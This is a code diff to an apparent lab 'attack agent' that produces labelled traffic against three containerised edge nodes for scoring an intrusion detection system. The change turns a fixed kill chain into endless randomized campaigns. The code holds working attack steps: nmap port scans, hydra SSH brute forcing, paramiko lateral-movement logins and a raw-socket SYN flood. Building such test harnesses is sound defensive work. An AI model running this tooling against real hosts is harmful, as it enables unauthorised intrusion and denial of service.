@@ -1,12 +1,16 @@
 """
 Attack Agent (Person A)
 
-Runs a multi-stage kill chain against the edge nodes:
-    port_scan -> brute_force -> lateral_movement -> ddos
+Runs randomized attack campaigns against the edge nodes. Each campaign
+independently and randomly chooses:
+    - which 2-4 of the 4 attack types occur
+    - which node(s) each attack targets
+    - timing between stages
+    - attack-specific parameters (ddos rate/duration, how many nodes hit)
 
-Every action must be appended to the ground truth file with an exact
-timestamp -- this file is what Person D's Evaluation Module scores against,
-so accuracy here matters more than anywhere else in the project.
+This means no two runs -- and no two campaigns within the same run -- look
+identical. Every action is still logged to the ground truth file with an
+exact timestamp.
 """
 
 import os
@@ -25,12 +29,12 @@ from scapy.all import IP, TCP
 GROUND_TRUTH_PATH = "/data/ground_truth.jsonl"
 WORDLIST_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wordlist.txt")
 
-# Fixed IPs from docker-compose.yml -- keep this in sync if those ever change.
 NODE_IPS = {
     "172.28.0.11": "edge-node-1",
     "172.28.0.12": "edge-node-2",
     "172.28.0.13": "edge-node-3",
 }
+ALL_IPS = list(NODE_IPS.keys())
 
 
 def log_ground_truth(stage: str, target: str, detail: str = ""):
@@ -46,7 +50,7 @@ def log_ground_truth(stage: str, target: str, detail: str = ""):
 
 
 # ---------------------------------------------------------------------------
-# Stage 1: Port Scan (reconnaissance across the whole subnet)
+# Port Scan -- now targets a random subset of 1-3 nodes, not always all 3
 # ---------------------------------------------------------------------------
 
 def parse_nmap_xml(xml_text: str) -> dict:
@@ -57,7 +61,6 @@ def parse_nmap_xml(xml_text: str) -> dict:
         if addr_el is None:
             continue
         ip = addr_el.get("addr")
-
         open_ports = []
         ports_el = host.find("ports")
         if ports_el is not None:
@@ -92,28 +95,16 @@ def run_port_scan(targets: list, top_ports: int = 1000) -> dict:
 
 
 # ---------------------------------------------------------------------------
-# Stage 2: Brute Force (focused attack on one target with SSH open)
+# Brute Force -- target is a single random node
 # ---------------------------------------------------------------------------
-
-def pick_brute_force_target(open_ports_by_ip: dict) -> str:
-    for ip, ports in open_ports_by_ip.items():
-        if 22 in ports:
-            return ip
-    return None
-
 
 def run_brute_force(target_ip: str, username: str = "admin") -> bool:
     node_name = NODE_IPS.get(target_ip, target_ip)
     print(f"[attack-agent] starting brute_force against {node_name} ({target_ip})")
 
     cmd = [
-        "hydra",
-        "-l", username,
-        "-P", WORDLIST_PATH,
-        "-t", "4",
-        "-f",
-        "-V",
-        f"ssh://{target_ip}",
+        "hydra", "-l", username, "-P", WORDLIST_PATH,
+        "-t", "4", "-f", "-V", f"ssh://{target_ip}",
     ]
     result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
     output = result.stdout + result.stderr
@@ -127,20 +118,12 @@ def run_brute_force(target_ip: str, username: str = "admin") -> bool:
         target=node_name,
         detail=f"username={username} attempts={num_passwords} succeeded={succeeded}",
     )
-
     return succeeded
 
 
 # ---------------------------------------------------------------------------
-# Stage 3: Lateral Movement (pivot to a different node using "found" creds)
+# Lateral Movement -- source and target are both random, and always different
 # ---------------------------------------------------------------------------
-
-def pick_lateral_target(open_ports_by_ip: dict, already_targeted_ip: str) -> str:
-    for ip, ports in open_ports_by_ip.items():
-        if ip != already_targeted_ip and 22 in ports:
-            return ip
-    return None
-
 
 def run_lateral_movement(source_ip: str, target_ip: str,
                           found_username: str = "admin",
@@ -158,7 +141,7 @@ def run_lateral_movement(source_ip: str, target_ip: str,
         succeeded = True
         client.close()
     except paramiko.AuthenticationException:
-        succeeded = False  # expected -- no real account exists on the edge nodes yet
+        succeeded = False
     except Exception as e:
         print(f"[attack-agent] lateral_movement connection error: {e}")
         succeeded = False
@@ -170,27 +153,12 @@ def run_lateral_movement(source_ip: str, target_ip: str,
     )
     return succeeded
 
+
 # ---------------------------------------------------------------------------
-# Stage 4: DDoS (rate-limited, time-boxed SYN flood across all nodes)
+# DDoS -- random subset of nodes, random rate, random duration
 # ---------------------------------------------------------------------------
 
-DDOS_DURATION_SECONDS = 10
-DDOS_RATE_PPS = 50  # packets per second, per target -- capped for safety
-
-
-def flood_target(target_ip: str, duration: int, rate: int, counts: dict):
-    """
-    Sends a rate-limited stream of TCP SYN packets to port 22 (the one port
-    we know is actually open) for `duration` seconds. This is a SYN flood --
-    the classic DDoS technique of overwhelming a target's half-open
-    connection queue by never completing the handshake.
-
-    We open ONE raw socket and reuse it for every packet -- scapy's send()
-    opens and closes a fresh socket on every call, which is expensive enough
-    that it silently throttled us to ~15pps even when we asked for 50pps.
-    Reusing the socket removes that overhead so the achieved rate actually
-    matches the requested rate.
-    """
+def flood_target(target_ip: str, duration: float, rate: float, counts: dict):
     interval = 1.0 / rate
     end_time = time.time() + duration
     sent = 0
@@ -204,10 +172,6 @@ def flood_target(target_ip: str, duration: int, rate: int, counts: dict):
             pkt = IP(dst=target_ip) / TCP(dport=22, flags="S", sport=random.randint(1024, 65535))
             raw_sock.sendto(bytes(pkt), (target_ip, 0))
             sent += 1
-
-            # Only sleep for whatever time is left after accounting for how
-            # long building + sending the packet actually took -- this is
-            # what makes the achieved rate match the configured rate.
             elapsed = time.time() - iter_start
             remaining = interval - elapsed
             if remaining > 0:
@@ -218,16 +182,11 @@ def flood_target(target_ip: str, duration: int, rate: int, counts: dict):
     counts[target_ip] = sent
 
 
-def run_ddos(targets: list, duration: int = DDOS_DURATION_SECONDS, rate: int = DDOS_RATE_PPS):
-    """
-    Stage 4 (final) of the kill chain: floods all targets at once, in
-    parallel threads, for a fixed short duration. This is the "Impact"
-    stage in MITRE terms -- the attacker no longer cares about staying
-    quiet, so hitting everything at once is realistic here, unlike the
-    earlier stealthier stages.
-    """
+def run_ddos(targets: list):
+    duration = random.uniform(8, 12)
+    rate = random.uniform(40, 60)
     print(f"[attack-agent] starting ddos against {targets} "
-          f"(rate={rate}pps/target, duration={duration}s)")
+          f"(rate={rate:.1f}pps/target, duration={duration:.1f}s)")
 
     counts = {}
     threads = [
@@ -244,40 +203,57 @@ def run_ddos(targets: list, duration: int = DDOS_DURATION_SECONDS, rate: int = D
         log_ground_truth(
             stage="ddos",
             target=node_name,
-            detail=f"packets_sent={counts.get(ip, 0)} rate_pps={rate} duration_s={duration}",
+            detail=f"packets_sent={counts.get(ip, 0)} rate_pps={rate:.1f} duration_s={duration:.1f}",
         )
+
+
+# ---------------------------------------------------------------------------
+# Campaign generator -- genuinely random each time
+# ---------------------------------------------------------------------------
+
+def run_one_campaign(campaign_number: int):
+    num_stages = random.randint(2, 4)
+    stages = random.sample(["port_scan", "brute_force", "lateral_movement", "ddos"], k=num_stages)
+
+    print(f"[attack-agent] campaign #{campaign_number} plan: {stages}")
+
+    for stage in stages:
+        if stage == "port_scan":
+            num_targets = random.randint(1, 3)
+            targets = random.sample(ALL_IPS, k=num_targets)
+            run_port_scan(targets)
+
+        elif stage == "brute_force":
+            target_ip = random.choice(ALL_IPS)
+            run_brute_force(target_ip)
+
+        elif stage == "lateral_movement":
+            source_ip, target_ip = random.sample(ALL_IPS, k=2)  # always two distinct nodes
+            run_lateral_movement(source_ip, target_ip)
+
+        elif stage == "ddos":
+            num_targets = random.randint(1, 3)
+            targets = random.sample(ALL_IPS, k=num_targets)
+            run_ddos(targets)
+
+        time.sleep(random.uniform(5, 10))
+
+    print(f"[attack-agent] campaign #{campaign_number} complete.")
 
 
 def main():
     time.sleep(10)
 
-    targets = list(NODE_IPS.keys())
-    open_ports_by_ip = run_port_scan(targets)
-
-    time.sleep(6)  # let the port scan traffic clear the sensor's window
-
-    brute_force_target = pick_brute_force_target(open_ports_by_ip)
-    if brute_force_target:
-        run_brute_force(brute_force_target)
-
-        time.sleep(6)  # let brute force traffic clear before pivoting
-
-        lateral_target = pick_lateral_target(open_ports_by_ip, brute_force_target)
-        if lateral_target:
-            run_lateral_movement(brute_force_target, lateral_target)
-        else:
-            print("[attack-agent] no other SSH-open node found, skipping lateral_movement stage")
-    else:
-        print("[attack-agent] no SSH-open target found, skipping brute_force and lateral_movement stages")
-
-    time.sleep(6)  # let lateral movement traffic clear before the flood
-
-    run_ddos(targets)
-
-    print("[attack-agent] full kill chain complete (port_scan -> brute_force -> "
-          "lateral_movement -> ddos). Idling.")
+    campaign_number = 1
     while True:
-        time.sleep(30)
+        print(f"[attack-agent] ===== starting campaign #{campaign_number} =====")
+        run_one_campaign(campaign_number)
+
+        quiet_period = random.uniform(20, 40)
+        print(f"[attack-agent] quiet for {quiet_period:.1f}s before next campaign")
+        time.sleep(quiet_period)
+        campaign_number += 1
+
 
 if __name__ == "__main__":
     main()
